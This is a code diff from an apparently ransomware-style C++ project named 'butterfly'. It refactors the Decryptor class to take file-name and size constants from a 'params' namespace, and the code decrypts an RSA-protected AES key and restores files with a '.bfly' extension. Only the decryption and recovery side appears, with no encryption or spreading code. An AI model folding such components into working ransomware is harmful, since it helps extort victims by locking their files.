@@ -19,17 +19,17 @@ Decryptor::Decryptor() : _aesDecryptor(new aes::AESDecryptor())
 void Decryptor::removeDecryptedFiles()
 {
 
-    butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
-    butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
-    butterfly::removeFile(butterfly::RSA_EKIV_FILENAME);
+    butterfly::removeFile(butterfly::params::ENC_CPRIVATERSA_FILENAME);
+    butterfly::removeFile(butterfly::params::ENC_AESKEY_FILENAME);
+    butterfly::removeFile(butterfly::params::RSA_EKIV_FILENAME);
 
 }
 
 bool Decryptor::getAESKeyPairFromUnencryptedFile(std::string &aeskeypair)
 {
-    if ( butterfly::existsFile(butterfly::UNENC_AESKEY_FILENAME) )
+    if ( butterfly::existsFile(butterfly::params::UNENC_AESKEY_FILENAME) )
     {
-        aeskeypair = butterfly::readBinFile(butterfly::UNENC_AESKEY_FILENAME);
+        aeskeypair = butterfly::readBinFile(butterfly::params::UNENC_AESKEY_FILENAME);
 
         if ( !aeskeypair.empty() )
         {
@@ -64,7 +64,7 @@ void Decryptor::invokeDir(const std::string &dirPath)
 
     // Decrypt the AESKey.bin file and get AESKey and AESIV
     std::string aeskey, aesiv;
-    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aeskey, aesiv);
+    decryptAESKeyPair(butterfly::params::ENC_AESKEY_FILENAME, aeskey, aesiv);
 
     // Set static AESKey and AESIV
     _aesDecryptor->setAESKey(aeskey);
@@ -77,10 +77,10 @@ void Decryptor::invokeDir(const std::string &dirPath)
     for (auto &file: files)
     {
         // Check if the provided file path has the .bfly extension
-        if ( DirectoryIterator::getFileExtension(file) == butterfly::ENC_BFLY_FILE_ENDING )
+        if ( DirectoryIterator::getFileExtension(file) == butterfly::params::ENC_BFLY_FILE_ENDING )
         {
             // Compare file size with the MAX FILE SIZE
-            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE)
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::params::MAX_FILE_SIZE)
             {
                 #ifdef LOGGING
                 LOG_TRACE("Spawn a new decryption thread for file: " << file.string());
